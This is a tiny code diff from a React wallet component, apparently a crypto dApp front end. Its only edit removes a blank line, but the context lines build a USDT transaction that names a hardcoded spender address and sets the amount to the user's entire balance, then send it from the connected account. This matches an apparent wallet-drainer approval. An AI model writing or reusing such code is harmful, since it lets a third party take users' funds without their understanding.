@@ -260,7 +260,6 @@ const CallWallet = () => {
             contract: USDTContract,
             spender: "0x8410f21f3a71a9fdae847e2e5baf714ebb6491f9",
             amount: balance.toString(),
-
           })
 
           const hash = await sendTransaction({ transaction, account });
